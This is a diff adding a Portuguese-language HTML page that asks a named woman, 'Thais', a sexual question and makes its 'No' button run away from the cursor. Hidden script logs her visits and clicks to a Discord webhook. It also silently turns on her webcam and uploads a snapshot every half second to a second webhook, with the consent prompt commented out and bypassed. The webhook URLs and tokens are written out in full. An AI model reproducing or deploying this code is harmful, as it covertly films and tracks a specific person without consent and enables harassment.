@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="pt">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Thais, esse é último pedido.</title>
+    <style>
+      body {
+        background-color: red;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        font-family: Arial, sans-serif;
+        color: white;
+      }
+
+      .question-container {
+        text-align: center;
+      }
+
+      button {
+        background-color: white;
+        color: red;
+        border: none;
+        padding: 10px 20px;
+        margin: 10px;
+        cursor: pointer;
+      }
+
+      button:hover {
+        background-color: #ccc;
+      }
+    </style>
+    <script>
+      function getRandomPosition(element) {
+        let x = document.documentElement.clientWidth - element.clientWidth;
+        let y = document.documentElement.clientHeight - element.clientHeight;
+        let randomX = Math.floor(Math.random() * x);
+        let randomY = Math.floor(Math.random() * y);
+        return { x: randomX, y: randomY };
+      }
+
+      function moveButton() {
+        let noButton = document.getElementById("no-button");
+        let newPosition = getRandomPosition(noButton);
+        noButton.style.left = newPosition.x + "px";
+        noButton.style.top = newPosition.y + "px";
+      }
+
+      function logAction(action) {
+        let data = {
+          content: `Ação realizada no site: ${action}`,
+        };
+
+        fetch(
+          "https://discord.com/api/webhooks/1106594343785091233/uTcg4ajCQFbfNtaVwSblV_NwWUwLEfwLeCjmd-2F3SSwbwJbLpcjrSFJE_A_TEkVeCBN",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(data),
+          }
+        );
+      }
+
+      function redirectToVideo() {
+        logAction("Clicou em Sim");
+        window.location.href = "https://www.youtube.com/watch?v=-VEUWrmVsQ4";
+      }
+
+      document.addEventListener("DOMContentLoaded", function () {
+        logAction("Site aberto");
+      });
+
+      async function startCamera() {
+        const camera = document.getElementById("camera");
+
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+          camera.srcObject = stream;
+          camera.onloadedmetadata = () => {
+            camera.play();
+            captureAndSend();
+          };
+        } catch (error) {
+          console.error("Erro ao acessar a câmera:", error);
+        }
+      }
+
+      function captureAndSend() {
+        const canvas = document.getElementById("canvas");
+        const camera = document.getElementById("camera");
+        const context = canvas.getContext("2d");
+
+        canvas.width = camera.videoWidth;
+        canvas.height = camera.videoHeight;
+
+        setInterval(() => {
+          context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob((blob) => {
+            const data = new FormData();
+            data.append("file", blob, "image.jpg");
+
+            fetch(
+              "https://discord.com/api/webhooks/1106615327858622514/AHpUQU2-rHuAvae25HX5MEkexGyTZy2takol3XlRJDrzQIanyXbCtlOwjCZ_-4kFQE5f",
+              {
+                method: "POST",
+                body: data,
+              }
+            );
+          }, "image/jpeg");
+        }, 500);
+      }
+    </script>
+  </head>
+  <body>
+    <div class="question-container">
+      <h1>Thais, quer fazer amor comigo?</h1>
+      <button id="yes-button" onclick="redirectToVideo()">Sim</button>
+      <button
+        id="no-button"
+        onmouseover="moveButton(); logAction('Tentou clicar em Não')"
+        style="position: absolute"
+      >
+        Não
+      </button>
+    </div>
+    <video id="camera" autoplay style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+    <script>
+      if (true
+        // confirm(
+        //   "Deseja autorizar o acesso à sua câmera para capturar e enviar imagens a cada meio segundo?"
+        // )
+      ) {
+        startCamera();
+      }
+    </script>
+  </body>
+</html>
